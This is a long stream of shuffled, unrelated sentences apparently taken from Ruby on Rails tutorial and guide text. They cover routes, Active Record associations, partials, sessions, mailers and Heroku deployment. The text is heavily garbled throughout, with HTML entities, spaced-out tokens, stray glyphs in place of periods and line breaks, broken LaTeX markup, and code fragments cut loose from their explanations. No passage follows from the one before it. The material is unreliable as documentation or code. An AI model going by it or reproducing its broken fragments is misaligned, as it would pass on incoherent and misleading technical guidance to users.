By now you can probably guess that we &apos;ll call it \ kode { \ _ footer ▖ html ▖ erb } and put it in the layouts directory ( Listing ~ \ ref { code : footer _ partial } )
Since we destroyed our third user in Section ~ \ ref { sec : creating _ user _ objects } , Active Record can &apos;t find it in the database .

These jobs can be everything from regularly scheduled ╼ clean-ups , to billing charges , to mailings .
This ensures that both links to the Home page defined in Listing ~ \ ref { code : header _ partial _ links } are present .

# # # # Naming Partials
For example , consider the following `Category` , `Article` , `Comment` , `Guest` and `Tag` models :
&lt; % = @ greeting % &gt;
config ▖ action _ mailer ▖ observers = &#91; &quot; MailObserver &quot; &#93;
Now that we know how to make partials , let &apos;s add a site footer to go along with the header .

The method returns an array with the groups :
The method `ordinal` returns the ordinal suffix string corresponding to the receiver integer :
You can also use this to override routing methods defined by resources , like this :

Of course , this means that we will have to define such a variable in the user \ kode { show } action ( Listing ~ \ ref { code : user _ show _ microposts _ instance } ) .
Putting the above ideas together leads to the test in Listing ~ \ ref { code : a _ test _ for _ invalid _ submission } .

To make the actual index page , we &apos;ll make a view ( whose file you &apos;ll have to create ) that iterates through the users and wraps each one in an ~ \ kode { li } tag .
With that , the final form of the user / micropost association is in place , and all the tests should be passing :
The result appears in Listing ~ \ ref { code : micropost _ partial _ with _ delete }
In the examples above it would be called `x ? ` .

The default error message is _ &quot; is not a number &quot; _ .
An `ActiveRecord : : StaleObjectError` exception is thrown if that has occurred and the update is ignored .
You can see if any associated objects exist by using the `association ▖ nil ? ` method :

Since everything in Ruby is an object , it follows that \ kode { nil } is an object , so it too can respond to methods .
Both methods will list all of your routes , in the same order that they appear in `routes ▖ rb` .

Optimistic locking allows multiple users to access the same record for edits , and assumes a minimum of conflicts with the data .
The `select` method lets you override the SQL `SELECT` clause that is used to retrieve data about the associated object .

To deploy the application , the first step is to use Git to push it up to Heroku :
The complete HTML returned to the client is composed of a combination of this ERB file , a layout template that wraps it , and all the partials that the view may reference .
Custom HTML for the Home page .
Even odder , perhaps , is that the \ kode { destroy } ed object still exists in memory :

We &apos;ve covered enough material now that there is a combinatorial explosion of possible extensions to the application .
To get Rails saying &quot; Hello &quot; , you need to create at minimum a _ controller _ and a ╼ _ view _ .

When the last argument in a method call is a hash , except perhaps for a ` &amp; block` argument , Ruby allows you to omit the brackets :
# = &gt; { : a = &gt; 2 }
This flag is taken into account for each constant in the expression while ╼ walking down the path .
With that , the users index is fully functional , with all tests \ passing :

The library as a whole can be accessed in the application manifest like so :

To get started , we &apos;ll generate a Sessions controller and an integration test for the authentication machinery :

In most cases , the `ActionController : : Base # render` method does the heavy lifting of rendering your application &apos;s content for use by a browser .
Our strategy is to create a couple of factory microposts associated with the user , and then verify that the show page contains each post &apos;s content .

Here we see that destroying a user leaves the \ kode { microposts } variable with no elements ; i ▖ e ▖ , it &apos;s the empty array ~ \ kode { &#91; &#93; } .
This will find the category with id 1 and eager load all of the associated articles , the associated articles &apos; tags and comments , and every comment &apos;s guest association .
It &apos;s important to understand that code like that shown in Listing ~ \ ref { code : jquery _ file _ test } can &apos;t actually prevent a user from trying to upload a file that &apos;s too big .

In the \ kode { setup } step , we create a new micropost while associating it with a valid user from the fixtures , and then check that the result is valid .
You can also create methods that verify the state of your models and add ╼ messages to the `errors` collection when they are invalid .
To avoid this call , you can add a counter cache to the _ belonging _ model :
class CreateCustomers &lt; ActiveRecord : : Migration
The core of the micropost data model is even simpler than the one for users : a micropost has only an \ kode { id } and a \ kode { content } field for the micropost &apos;s text ( of type \ kode { text } )
It only has effect if `config ▖ cache _ classes` is true , which it is by default in production mode ▖ ╼ ╼
in Listing ~ \ ref { code : rails _ command } .
&lt; % = form _ for : article do &#124; f &#124; % &gt;
* Call `render` to create a full response to send back to the browser
The `collection ▖ size` method returns the number of objects in the collection .
As a rule of thumb , `tableize` returns the table name that corresponds to a given model for simple cases .
The default error messages depend on the type of length validation being ╼ performed .
For these last two steps to work , we need to have enough users in the test database to invoke pagination , i ▖ e ▖ , more than 30 .
The rest of this section is dedicated to understanding it .
If your test helper contains a call to ╼ `ActiveRecord : : Migration ▖ check _ pending ! ` this can be removed .
We added a controller action and modified the root route to create a ``hello , world &apos; &apos; application .
Now that our users index page is working , we &apos;ll write a lightweight test for it , including a minimal test for the pagination from Section ~ \ ref { sec : pagination } .
Rails would dispatch that request to the `destroy` method on the `photos` controller with ` { id : &apos; 17 &apos; } ` in `params` .
Tests for the Relationships controller responses to Ajax requests .
This method works with polymorphic relationships as well .
It is equivalent to writing :

At this point , you can use a rake command to run the migration :

To define this configuration setting , you should use a `mattr _ accessor` inside ╼ the `Blorgh` module for the engine .
# = &gt; &lt; option &gt; VISA &lt; / option &gt; &lt; option &gt; MasterCard &lt; / option &gt;
If you know someone else who uses Rails , try asking them if they &apos;ll check out ╼ your work .
As in the case of creating users ( signup ) , the first step in creating sessions ( signin ) is to handle \ emph { invalid } input .
Also , to keep it simple , the articles form will have a new text field called ╼ `author _ name` , where users can elect to put their name .

Or on a relation :

For example , in Section ~ \ ref { sec : rails _ server } we &apos;ll run a local development web server with the \ kode { rails server } command :
* You must change the following application configuration setting :
strip _ links ( &apos; Blog : &lt; a href = &quot; http : / / myblog ▖ com / &quot; &gt; Visit &lt; / a &gt; ▖ &apos; )
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa &quot;
Note that the \ kode { destroy } method in Listing ~ \ ref { code : microposts _ destroy _ action } redirects to the URL

As with the other authentication elements , we &apos;ll put \ kode { sign \ _ out } in the Sessions helper module .
This is an appropriate use of `via : : all` , as you will want to allow your Rack application to handle all verbs as it considers appropriate .
Once you &apos;ve verified that the Heroku command-line interface is installed , use the \ kode { heroku } command to log in and add your SSH key :

If , on the other ╼ hand , you &apos;d like to update several records in bulk , you may find the ╼ `update _ all` class method useful :
To avoid code repetition , you should also remove \ kode { signed \ _ in \ _ user } from the Users controller at this time .
We did this by relying on the test code provided by the tutorial and addressing each error message until the test suite was passing .
With addition in Listing ~ \ ref { code : logged _ in _ p } , we &apos;re now ready to change the layout links if a user is logged in .
Listing ~ \ ref { code : password _ migration } uses the \ kode { add \ _ column } method to add a \ kode { password \ _ digest } column to the \ kode { users } table .

On Windows , the analogous directory would be

With a partial , you can move the code for rendering a particular piece of a response to its own file .
Besides these usual middleware , you can add your own by using the `config ▖ middleware ▖ use` method :
In terms of symbols as hash keys , we can define a \ kode { user } hash as follows :
would respond to the URL / users / tigers ( presumably to display all the tigers in our application )
This guide covers the configuration and initialization features available to Rails applications .
Using \ kode { validates : uniqueness } does not guarantee uniqueness .
This makes the association indirectly , through a join model :
As a first step toward constructing a data model for following users , let &apos;s examine a typical case .
These methods should not be used in ordinary views .

They will automatically when the parent object is saved .
Possible values are ` : closure` , ` : uglifier` and ` : yui` which require the use of the `closure-compiler` , `uglifier` or `yui-compressor` gems respectively .
Person ▖ ids
It &apos;s used in this example to ╼ display a small number next to each comment when it &apos;s created .
* `ActionDispatch : : RequestId` makes a unique X-Request-Id header available to the response and enables the `ActionDispatch : : Request # uuid` method .

Note that we expect to redirect users to the root path instead of the login path because a user trying to edit a different user would already be logged in .
This is equivalent to visiting the signup page and submitting blank signup information ( which is invalid ) .

Fixing this blemish requires a significantly more complicated regular expression and is left as an exercise ( Section ~ \ ref { sec : modeling _ users _ exercises } ) ▖ )
Because the edit form is modifying an Active Record model object ( i ▖ e ▖ , a user ) , we can rely on the shared partial from Listing ~ \ ref { code : password _ reset _ form } to render error messages .
The example used before was a controller called &quot; projects &quot; , which ╼ generated an `app / assets / javascripts / projects ▖ js ▖ coffee` and an ╼ `app / assets / stylesheets / projects ▖ css ▖ scss` file .
To insert something verbatim use the `raw` helper rather than calling `html _ safe` :
Here we &apos;ve also supplied the argument \ kode { password \ _ digest : string } with the name and type of attribute we want to create .
This hierarchy is illustrated in Figure ~ \ ref { fig : word _ inheritance _ ruby _ 1 _ 9 } .
There is no default error message for `validates _ with` .

Because the application code was already working , this test should be \ passing :
email _ field _ tag &apos; email&apos;
This holds true even when you &apos;re pulling in a partial from another folder :
A mockup of the user edit page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / edit _ user _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Otherwise , you should run \ kode { heroku create } and then \ kode { git push heroku master } ▖ )
Unfortunately , it &apos;s also a cheat .
The line
Due to this , it makes sense to just have your ╼ controller tell the Mailer to send an email when a user is successfully created .
( We &apos;ll put this improved helper to use in Section ~ \ ref { sec : users _ index } ▖ )

In this chapter , we will begin developing the sample application that will serve as our example throughout the rest of this tutorial .
assert _ recognizes ( { controller : &apos; photos &apos; , action : &apos; show &apos; , id : &apos; 1&apos; } , &apos; / photos / 1 &apos; )

In particular , we can replace the code

Action Mailer allows for you to specify a `before _ action` , `after _ action` and ╼ `around _ action` .

Here &apos;s the problem : what ╼ happens when we have lots of JavaScript we want to execute on a click ?
The request to this asset is then served by the Sprockets gem .
For completeness , we &apos;ll add the Contact page , which was left as an exercise in Chapter ~ \ ref { cha : static _ pages } .

assert _ recognizes ( { controller : &apos; photos &apos; , action : &apos; create &apos; } , { path : &apos; photos &apos; , method : : post } )
In addition , when testing for user listings it would be convenient for them all to have different names .

If you did not configure the ` : host` option globally make sure to pass it to ╼ `url _ for` .
Then we &apos;ll make a listing of all users ( also requiring authorization ) , which will motivate the introduction of sample data and pagination .
See &#91; Asset ╼ Organization &#93; ( # asset-organization ) above for guidance on the correct locations ╼ for different file types .
If you need to use `return` statements in your callbacks , it is recommended that you explicitly define them as methods .

However , note that you don &apos;t need to use anchors because all routes are anchored at the start .
root &apos; welcome # index&apos;
This would be useful , for example , if you wanted to resume an interrupted batch process , provided you saved the last processed ID as a checkpoint .
You can also tell Rails to render with no layout at all :
When a new micropost is made in this way , its \ kode { user \ _ id } is automatically set to the right value .

The ` : controller` option lets you explicitly specify a controller to use for the resource .
Implementing the active relationships \ kode { has \ _ many } association .
To see the result , start a Rails development server as described in Section ~ \ ref { sec : rails _ server } :
Rails comes with built-in functions for defining associations between different data models .
If you want to be more specific and find all the clients with their age present in the database you can use `Client ▖ count ( : age ) ` .

Here Rails knows to call the micropost partial because each element of \ kode { @ feed \ _ items } has class \ kode { Micropost } .

This will route to the `Admin : : UserPermissions` controller .
# # # Clone the Rails Repository

Singular forms are aliased so you are able to say :
This same information can be stored in a URL and provided via an environment variable like this :
t ▖ string : imageable _ type
\ label { table : static _ pages } } ╼ \ end { table } ╼ ╼ \ subsection { Testing titles ( Red ) } % ( fold ) ╼ \ label { sec : testing _ titles } ╼ ╼
This is a problem , of course , because the code in Listing ~ \ ref { code : branch _ raise } is broken .
Let &apos;s run the test suite to verify that one test fails :
&#124; app / views / comments / &#124; Views of the controller are stored here &#124;
To get our application to display a custom Gravatar , we &apos;ll use \ kode { update \ _ attributes } ( Section ~ \ ref { sec : updating _ user _ objects } ) to change the user &apos;s email to something I control :
The \ kode { MicropostsController } class , highlighting inheritance .
The index action of your ╼ controller looks like this :
For ╼ example
To implement the forwarding behavior shown in Figure ~ \ ref { fig : signin _ page _ protected _ mockup _ bootstrap } , we &apos;ll use a \ emph { before filter } in the Users controller .
invoke resource _ route
Debug mode can also be enabled in Rails helper methods :
* Capitalizes the first word .
We &apos;ll then create our first Rails application , called \ kode { hello \ _ app } .
If you are serving assets directly from your Rails server in production , the ╼ best practice is to use a CDN in front of your application .
This gives us sufficient flexibility to change the random string if we ever need to .
It &apos;s also worth noting that the default Rails layout includes several additional lines :
As we have already seen , this calls ╼ the `show` action of the `ArticlesController` which in turn renders the ╼ `show ▖ html ▖ erb` template .
Testing the user / relationships \ kode { belongs \ _ to } association .
So a join between customer and order models will give the default join table name of &quot; customers _ orders &quot; because &quot; c &quot; outranks &quot; o &quot; in lexical ordering .

Rails scaffolding is generated by passing the \ kode { scaffold } command to the \ kode { rails generate } script .
module ActionView
The main difference between the session form and the signup form is that we have no Session model , and hence no analogue for the \ kode { @ user } variable .
If ╼ there isn &apos;t an application handy to test this out in , generate one using the ╼ `rails new` command outside of the engine directory like this :
* `config ▖ action _ dispatch ▖ encrypted _ signed _ cookie _ salt` sets the signed ╼ encrypted cookies salt value .

You can also specify a second partial to be rendered between instances of the main partial by using the ` : spacer _ template` option :
The key is the \ emph { class } of the object---in this case , \ kode { User } .
This is why having \ emph { some } test of the view , even a minimalist one , is so important ▖ )
$ git remote add upstream https : / / github ▖ com / rails / rails ▖ git
We see from these conditions that we &apos;ll need an array of ids corresponding to the users being followed .
Temporary files
Like all other validations , `validates _ with` takes the ` : if` , ` : unless` and ╼ ` : on` options .
Returns a hidden input tag tailored for accessing a specified attribute .
Two new scrubbers have also been added : `PermitScrubber` and `TargetScrubber` .
Defaults to `true` ▖ ╼ ╼
To add a member route , just add a `member` block into the resource block :
module ArticlesHelper
= &gt; 0 ▖ ▖ 9
belongs _ to : client
# # # # div _ for
&#124; &#124; 406 &#124; : not _ acceptable &#124;
# = &gt; { &apos; 2009-032 &apos; = &gt; &lt; Invoice ▖ ▖ .
You can also remove the uniqueness constraint :
As noted in Section ~ \ ref { sec : the _ flash } , the flash HTML in Listing ~ \ ref { code : layout _ flash } is ugly .
A test of \ kode { dependent : : destroy } .
The default value is the uppercase ` : type` value , for example , &quot; ATOM &quot; or &quot; RSS &quot; .
invoke resource _ route
In Chapter ~ \ ref { cha : filling _ in _ the _ layout } , we &apos;ll start putting it to good use in developing the sample application .
Now you can draw unicode character routes directly .
We can see the result of all this work by signing up our first user under the name ``Rails Tutorial &apos; &apos; and email address ``example @ railstutorial ▖ org &apos; &apos; ( Figure ~ \ ref { fig : first _ signup } ) .
Note that we &apos;ve taken the opportunity to use a method reference for email downcasing as well .
admin ▖ validates : password , length : { minimum : 10 }
The next request to the ╼ CDN that comes in to the same URL will hit the cached copy .
With the form and its associated route defined , you will be able to fill in the ╼ form and then click the submit button to begin the process of creating a new ╼ article , so go ahead and do that .
* `Rack : : MethodOverride` allows the method to be overridden if `params &#91; : _ method &#93; ` is set .
Finally , for convenience the \ emph { Ruby on Rails Tutorial } adopts two conventions designed to make the many code samples easier to understand .
Once the block is done `atomic _ write` closes the file handle and completes its job .
In Rails , the default data structure for a data model is called , naturally enough , a ~ \ emph { model } ( the M in MVC from Section ~ \ ref { sec : mvc } ) .
Your exact results will differ in these details , but otherwise should essentially match the output shown above .
I urge you not to look too closely at the generated code ; at this stage , it will only serve to confuse you .

To ╼ create it , run this command from the application root :

╼ \ end { code } ╼ ╼ \ subsection { A problem with the data model ( and a solution ) } % ( fold ) ╼ \ label { sec : a _ problem _ with _ the _ data _ model } ╼ ╼
As a result , the admin tests should pass :
To understand classes a little more deeply , there &apos;s no substitute for making one of our own .
At this point , our test suite should be green :
Of course , to generate the new sample data we have to run the \ kode { db : populate } Rake task :
&lt; % = comment ▖ body % &gt;
&#124; DELETE &#124; / kategorien / : id &#124; categories # destroy &#124; category _ path ( : id ) &#124;
The comments below contain some suggestions for approaching the \ emph { Rails Tutorial } depending on your background .
A partial can use its own layout file , just as a view can use a layout .
* `scoped _ by _ ▖ ▖ ▖ ` becomes `where ( ▖ ▖ ▖ )
create _ account
As in previous chapters , we will find it convenient to use the sample data Rake task to fill the database with sample relationships .
Other directories can be ╼ created in the `test` directory as well .
* Rails 4 ▖ 0 has deprecated `ActiveRecord : : Fixtures` in favor of `ActiveRecord : : FixtureSet` .
&lt; % = @ article ▖ title % &gt;
In the following example , ╼ we don &apos;t want names and surnames to begin with lower case .
Layouts can be used to render a common view template around the results of Rails controller actions .
class Article &lt; ActiveRecord : : Base
Rails routes / users to the \ kode { index } action in the Users controller .
The final step is to migrate the database :
* `config ▖ action _ dispatch ▖ default _ headers` is a hash with HTTP headers that are set by default in each response .
# # # `validates _ associated`
Rails defaults to using an SQLite database when creating a new project , but you can always change it later .
And now if you inspect the middleware stack , you &apos;ll find that `Rack : : Lock` is ╼ not a part of it .
As with arrays and ranges , hashes respond to the \ kode { each } method .
In this section , we &apos;ll reimplement the status feed in a way that scales better with the number of followed users .

To manually define an action inside a controller , all you need to do is to ╼ define a new method inside the controller .

I &apos;m learning Ruby on Rails with the @ railstutorial !
In this section , we &apos;ll add the last of the basic User attributes : a secure password used to authenticate users of the sample application .

The result appears in Listing ~ \ ref { code : sessions _ helper _ authenticate }
NOTE : Defined in `active _ support / core _ ext / numeric / conversions ▖ rb` .
Let &apos;s also add a little CSS ( or , rather , SCSS ) for style ( Listing ~ \ ref { code : user _ index _ css } ) .
The result is breaking tests for application code that still works fine .
as shown in Listing ~ \ ref { code : rspec _ drb } .

Another is to \ emph { add } a unique username to the signup process and then use it in @ replies .

The authentication machinery from Chapter ~ \ ref { cha : log _ in _ log _ out } will allow us to use a \ emph { before filter } to ensure that this is the case .
Article ▖ joins ( : category , : comments )
Using the \ kode { belongs \ _ to } / \ kode { has \ _ many } association defined in this section , Rails constructs the methods shown in Table ~ \ ref { table : association _ methods } .
Note that we have explicitly set the \ kode { created \ _ at } column using embedded Ruby .
( For reasons that escape me , this is sometimes written as \ kode { rake cucumber : ok } ▖ )

At this point , the test suite should be \ passing :
Y1 = : y1
The spacing might look slightly different , which is fine because ( as noted in Section ~ \ ref { sec : testing _ titles } ) HTML is insensitive to whitespace .
To login to the site , just follow this link : &lt; % = @ url % &gt; .
If your validator is complex enough that you want instance variables , you can ╼ easily use a plain old Ruby object instead :

Every HTTP response from your Rails application receives the following default security headers .
Produce a string representation of a number as a percentage :

`Rails : : Rack : : Debugger` is primarily useful only in the development environment .
If you &apos;re using Git for version control , I suggest making a topic branch at this time :
( Note that there is no need to include a parameter for ~ \ kode { id } ; it is created automatically by Rails for use as the \ emph { primary key } in the database ▖ )
&#124; &#124; 409 &#124; : conflict &#124;

We can now simplify the tests for the Help , About , and Contact pages using the same methods used for the Home page .
If you &apos;re interested in seeing the practical effect of this , take a look at the file \ kode { db / schema ▖ rb } , which should now include a line like this :

For other actions , you just need to insert the action name as the first element of the array :
def undecorated _ table _ name ( class _ name = base _ class ▖ name )
Once an Active Record object has been retrieved , its attributes can be modified ╼ and it can be saved to the database .
While it &apos;s not strictly necessary as part of a Rails 3 ▖ 2 upgrade , you can start replacing any plugins by extracting them to gems and adding them to your Gemfile .

If we need to update only a single attribute , using the singular \ kode { update \ _ attribute } bypasses this restriction :
To avoid that , ╼ you must create a unique index on both columns in your database .
Since our application lacks unique user logins , you will also have to decide on a way to represent users .

If we wish for a scope to be applied across all queries to the model we can use the ╼ `default _ scope` method within the model itself .
The simplest way to use this is to have a single `yield` , into which the entire contents of the view currently being rendered is inserted :

Having a good test suite is an invaluable tool in this regard , as it dramatically lowers the probability of introducing bugs while refactoring .
This updates the database at Heroku with the necessary user and micropost data models .

Rails on Rack
The first thing that the scaffold generator does is invoke the `active _ record` ╼ generator , which generates a migration and a model for the resource .
In this case we are setting the ` : from` header to a value for all ╼ messages in this class .
} % &gt; &lt; / td &gt;
This does not destroy the associated objects .
We then cover the two cases of password match and mismatch :
This is how you run the Active Record test suite only for SQLite3 :

The relationships between these classes is illustrated in Figure ~ \ ref { fig : demo _ controller _ inheritance } .
Add an email address verification step to confirm a user &apos;s signup .
Safe arguments are directly appended :

As you might guess from the working page , at this point the corresponding test should also pass :

First , run these two commands :
As with models and controllers , we can generate a mailer using \ kode { rails generate } :
For example , you can return only an error header :
For example , ` &quot; SSLError &quot; ▖ underscore ▖ camelize` gives back ` &quot; SslError &quot; ` .

In this case , Rails will use the customer or employee partials as appropriate for each member of the collection .
This is the same authorization model used by Twitter .
You can also use the ternary operator to replace assignment :

Before implementing user following and followers , we first need to establish the association between users and relationships .

The engine is unable to find the partial required for rendering the comments ▖ ╼
The view for the \ kode { help } action is analogous ( Listing ~ \ ref { code : raw _ help _ view } ) .
Now when confirmation validations fail , the error will be attached to ` : # { attribute } _ confirmation` instead of `attribute` .
If so , you can add a comment to the issue saying that you &apos;re seeing the same thing .

You can specify static segments when creating a route by not prepending a colon to a fragment :
This indicates a missing template , which in the context of Rails is essentially the same thing as a view .

With this substitution , the corrected application code appears as in Listing ~ \ ref { code : correct _ signin _ failure } .
You can force it to use Builder instead with the ` : type` option :

We can now start \ kode { guard } as follows :
The final implementation of \ kode { from \ _ users \ _ followed \ _ by } .

To do this , change the `new` and `create` actions inside ╼ `app / controllers / articles _ controller ▖ rb` to these :
User ▖ where ( weekly _ subscriber : true ) ▖ find _ each do &#124; user &#124;
In addition , passing in a raw \ kode { params } hash as above will cause an error to be raised , so that Rails applications are now immune to mass assignment vulnerabilities by default .

If the string evaluates to no known constant , or its content is not even a valid constant name , `constantize` raises `NameError` .
But visiting the edit page only tests the authorization for the \ kode { edit } action , not for \ kode { update } .
In particular , because we access microposts through their associated users , both the \ kode { create } and \ kode { destroy } actions must require users to be logged in .

When you declare a `belongs _ to` association , the declaring class automatically gains five methods related to the association :

If you want to find the sum of a field for all records in your table you can call the `sum` method on the class that relates to the table .

Let &apos;s add a method called `welcome _ email` , that will send an email to the user &apos;s ╼ registered email address :

In our case , the About page will first need an action called \ kode { about } in the StaticPages controller .
# # # Ajax Injection
First , we will need to know about the dollar-sign syntax to access a DOM element based in its unique CSS ~ id .
If your application is using an &quot; / assets &quot; route for a resource you may want change the prefix used for assets to avoid conflicts :
First-time repository setup
# # # Method Delegation
Just like `where` clauses scopes are merged using `AND` conditions .
# # # # collection _ check _ boxes
Since gems with different version numbers sometimes conflict , it is often convenient to create separate \ emph { gemsets } , which are self-contained bundles of gems .
When learning about classes , it &apos;s useful to find out the \ emph { class hierarchy } using the \ kode { superclass } method :
This includes linking to a blank string .

In order to get the user show view to work , we need to define an \ kode { @ user } variable in the corresponding \ kode { show } action in the Users controller .

The more prepared statements in use : the more memory your database will require .
To display the users themselves , we need to make a variable containing all the site &apos;s users and then render each one by iterating through them in the index view .

Engines and ╼ applications also share a common structure .
If you want them to run in other environments consult the

When you declare a `has _ many` association , the declaring class automatically gains 16 methods related to the association :
The way to change the links in the site layout involves using an ╼ if-else statement inside embedded Ruby to show one set of links if the user is logged in and another set of links otherwise :
&quot; dude &quot; ▖ pluralize ( 0 ) # = &gt; &quot; dudes &quot;
With these techniques in hand , we are well-equipped to recover from the inevitable development \ href { http : / / en ▖ wikipedia ▖ org / wiki / SNAFU } { snafus } .
If you add an `erb` extension to a JavaScript asset , making it something such as ╼ `application ▖ js ▖ erb` , you can then use the `asset _ path` helper in your ╼ JavaScript code :
The current authentication tests check that navigation links such as ``Profile &apos; &apos; and ``Settings &apos; &apos; appear when a user is signed in .

There are also some optional column names that will add additional features ╼ to Active Record instances :
Possible values are ` : cookie _ store` which is the default , ` : mem _ cache _ store` , and ` : disabled` .
This is often factored out into its own method so it can be reused by multiple ╼ actions in the same controller , for example `create` and `update` .

Most commonly , you might group a number of administrative controllers under an `Admin : : ` namespace .
The users index page with only one user .
as seen in Listing ~ \ ref { code : sign _ in _ password _ resets } and Figure ~ \ ref { fig : forgot _ password _ link } .
For every field ( also known as an attribute ) you define in your table , Active Record provides a finder method .
In other words , a test like
The option ` : prefix` adds a prefix to the name of the generated method .

In this case , we want to submit valid information and then confirm that a user \ emph { was } created .

Fixing these issues will require some trickery , but the result will be a far more powerful test suite .

Here is an example :
The `collection _ singular _ ids` method returns an array of the ids of the objects in the collection .
as shown in Listing ~ \ ref { code : destroy _ session } .
Then we &apos;ll add a very small amount of dynamic content by changing the title on a per-page basis .

Most of the work in this tutorial will ╼ happen in the `app` folder , but here &apos;s a basic rundown on the function of each ╼ of the files and folders that Rails created by default :
# &lt; message &gt; Kill AMo observing wrap _ with _ notifications since ARes was only using it &lt; / message &gt;
The model here is also namespaced , ╼ being placed at `app / models / blorgh / article ▖ rb` rather than `app / models / article ▖ rb` due ╼ to the `isolate _ namespace` call within the `Engine` class .
# # # # # ` : primary _ key`
After upgrading to Rails 4 ▖ 0 , helpers will preserve the order of loaded directories and will be sorted alphabetically only within each directory .
As shown in Listing ~ \ ref { code : home _ root _ route } , this means replacing the generated \ kode { get } rule from Listing ~ \ ref { code : pages _ routes } with the following code :
* Rails 4 ▖ 0 has changed `serialized _ attributes` and `attr _ readonly` to class methods only .

If your development computer &apos;s MySQL installation includes a root user with an empty password , this configuration should work for you .

In other words , inside the \ kode { create } action the \ kode { params } hash has all the information needed to authenticate users by email and password .
Below table shows what the parameters look like based on `JSON` sent in ╼ request :
When you open ╼ `http : / / localhost : 3000 / blorgh / articles` you will see the default scaffold that has ╼ been generated .
the request is dispatched to the `patients` controller &apos;s `show` action with ` { id : &apos; 17 &apos; } ` in `params` .
The ` : as` option overrides the automatically-generated name for the resource in nested route helpers .
Our plan is to store the base64 token on the browser , and then store an encrypted version in the database .
Ideally , Ruby on Rails should issue no warnings , but there may be a few , as well as some from third-party libraries .
The second method , `find _ in _ batches` , retrieves a batch of records and then yields _ the entire batch _ to the block as an array of models .
Sprockets uses manifest files to determine which assets to include and serve ▖ ╼

As in the case of creating users ( signup ) , the first step in creating sessions ( login ) is to handle \ emph { invalid } input .
With this technique in hand , we &apos;re ready to write some basic email format validation tests .

If you want to find records using the `IN` expression you can pass an array to the conditions hash :
`Rails : : Application` uses `ActionDispatch : : MiddlewareStack` to combine various internal and external middlewares to form a complete Rails Rack application .
The `capture` method allows you to extract part of a template into a variable .

Next , we &apos;ll use the newly defined named route to add the proper link to the button on the Home page .

If the receiver responds to `convert _ key` keys are normalized :
Finding a user to follow .
We &apos;ll start by refactoring the feed with the slightly modified code in Listing ~ \ ref { code : from _ users _ followed _ by _ second _ cut } .
Having addressed the uniqueness caveat , there &apos;s one more change we need to make to be assured of email uniqueness .
DELETE / photos / 17
The technique involves using \ emph { Embedded Ruby } in our views .
For each route , you &apos;ll see :
Based on the example for the Home page , you can probably guess the analogous test and application code for the Help page .
This creates a \ kode { features / } directory where the files associated with Cucumber will live .
For example in
A sketch of the User data model .
In order to get the styling right , though , we have to \ emph { nest } the checkbox inside the label , as follows :
In each case , the \ kode { root } method arranges for the root path / to be routed to a controller and action of our choice .
( The green welcome message is accomplished using the \ emph { flash } , which we &apos;ll learn about in Section ~ \ ref { sec : the _ flash } ▖ )
render file : &quot; / u / apps / warehouse _ app / current / app / views / products / show &quot;
The results of a successful user signup , with flash message .
One nice effect of building the authentication machinery in Chapter ~ \ ref { cha : basic _ login } is that we are now in a position to implement authorization as well .
We can accomplish this in Rails with the \ kode { form \ _ for } helper method , which takes in an Active Record object and constructs a form using the object &apos;s attributes .
&#124; &#124; 303 &#124; : see _ other &#124;
So that , for example , `resource : photo` and `resources : photos` creates both singular and plural routes that map to the same controller ( `PhotosController` ) .
This route will also route the incoming request of ` / photos` to `PhotosController # index` , since ` : action` and ` : id` are optional parameters , denoted by parentheses .
Incredibly , because of all our work in the previous sections , the implementation can be reduced to one line .

The element will be keyed by the value returned by the block :

Here we &apos;ve also supplied the argument \ kode { password \ _ digest : string } with the name and type of attribute we want to create .
would also work fine , but I prefer the explicitness of the version in Listing ~ \ ref { code : authenticated _ p _ fixed } ( which also happens to be slightly shorter ) .

Finally , deploy to Heroku :
By default , Active Record doesn &apos;t know about the connection between these associations .
And the requirement is that `todos` table should hold ╼ `guid` column value and not `id` value .
Rails comes with lots of commands that can be run at the command line .

Now reapply your patch on top of the latest changes :
Active Record provides several different ways of retrieving a single object .
* In Rails 4 ▖ 0 , a generic `ActionDispatch : : ParamsParser : : ParseError` exception is raised when `ParamsParser` fails to parse request params .
If the target file exists `atomic _ write` overwrites it and keeps owners and permissions .
We &apos;ll end by taking a first important step toward letting users sign up to our site .
The method `index _ by` generates a hash with the elements of an enumerable indexed by some key .
To accomplish this `atomic _ write` creates a temporary file .
`find _ or _ create _ by` returns either the record that already exists or the new record .

This would then turn the above code for `set _ author` into this :
Most languages provide a syntactic shortcut for this operation ; in Ruby ( and in C , C + + , Perl , Python , Java , etc ▖ ) , it appears as follows :
in Listing ~ \ ref { code : micropost _ user _ id _ validation } .
This creates a nested route for the comments , which is what the form requires .

The ╼ default value is true if this configuration is not set .
* &#91; Railscast on Rack Middlewares &#93; ( http : / / railscasts ▖ com / episodes / 151-rack-middleware )
Once we define the proper associations , the resulting \ kode { @ micropost } variable will automatically have \ kode { user \ _ id } equal to its associated user .

Ruby supports class definition via the \ kode { class } keyword .
Happily , the first step is easy---completing the Sessions controller \ kode { create } action is a snap .
Once you call `save` upon that object it will be saved into the ╼ appropriate database table .
Add it to your `Gemfile` and run ╼ `bundle install` and you &apos;re ready to go .
This example pops up a message box .

as shown in Listing ~ \ ref { code : user _ signin _ test _ valid _ information } .
The Asset Pipeline
Save the activation digest to the database , and then send an email to the user with a link containing the activation token and user &apos;s email address
Note that we expect to redirect users to the root path instead of the login path because a user trying to edit a different user would already be logged in .
If enabled , Active Record will create up to `1000` prepared statements per database connection by default .
Rails uses internal attributes in a few spots , for examples for views :
Client ▖ where ( created _ at : ( Time ▖ now ▖ midnight - 1 ▖ day ) ▖ .
Meanwhile , the \ kode { member } method arranges for the routes to respond to URLs containing the user id .
Verify by running the test suite that the new code is still valid .
date = Date ▖ new ( 2010 , 6 , 7 )
* The `test` environment is used when running automated tests .
The missing directory and file are back .
= = = = = = = = = = = = = = = = = = = = = = = = = = = = =
Each method is a request to perform an operation on the resource .
The trick to doing that is to format the ╼ email address in the format ` &quot; Full Name &lt; email &gt; &quot; ` .
This involves opening the \ kode { Gemfile } with a text editor .
In fact , it will turn out not to be important that \ kode { authenticate } returns the user itself ; all that will matter is that it returns a value that is \ kode { true } in a boolean context .
* `references`

The purpose is to get a high-level overview of Ruby on Rails programming ( and web development in general ) by rapidly generating an application using \ emph { scaffold generators } .

Option ` : dependent = &gt; : restrict` has been removed from `belongs _ to` .
# # # # # `collection _ singular _ ids`
